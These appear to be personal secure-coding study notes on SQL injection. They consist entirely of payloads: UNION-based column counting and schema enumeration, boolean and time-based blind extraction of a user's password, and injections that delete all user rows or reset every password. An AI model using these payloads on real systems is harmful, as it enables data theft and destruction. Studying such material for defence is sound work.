# sc-notes
# my secure coding notes
# -------------------------------------
# SQLi
# SQL injection UNION attack

# (Pre-requisite: the number of columns is known)

# ----------------------------------------------------------------------------

# 2 methods for testing the number of columns in a given database table:

# ORDER BY keyword

# UNION operator
# Using the ORDER BY approach to find out the number of columns:

# 1' order by 1;-- -

# 1' order by 2;-- -

# 1' order by 3;-- -

# 1' order by 4;-- - 

# Using the UNION SELECT approach to find out the number of columns:

# 1' UNION SELECT null;-- -    (error)

# 1' UNION SELECT null, null;-- -   (error)

# 1' UNION SELECT null, null, null;-- -  (success)

# 1' UNION SELECT 1,2,table_schema from information_schema.tables;-- -

# 1' UNION SELECT 1,table_name,table_schema from information_schema.tables;-- -

# 1' UNION SELECT 1,column_name,table_schema from information_schema.columns where table_name='furniture';-- -

# 1' UNION SELECT 1,name,images from furniture.furniture;-- -

# 0' OR userid=IF([some condition],'1','0');-- -

# 0' OR userid=IF((SELECT substr(password,1,1) from user where userid='1')='a','1','0');-- -

# 0' OR userid=IF((SELECT substr(password,1,1) from user where userid='1')='b','1','0');-- -

# 1' OR userid=IF((SELECT substr(password,1,1) from user where userid='1')='a',SLEEP(0.3),'0');-- -

# 1' OR userid=IF((SELECT substr(password,1,3) from user where userid='1')='abc',SLEEP(0.3),'0');-- -

# -----------------after thoughts – more attack scenario---------------------------

# DELETE from user where userid = ‘${userid}’;

# DELETE from user where userid=’’ OR 1=1;-- - ‘${userid}’;

# UPDATE user SET age=’${age}’ WHERE userid=’${userid}’;

# UPDATE user SET age=’10’, password=’123’;-- - ’${age}’ WHERE userid=’${userid}’;
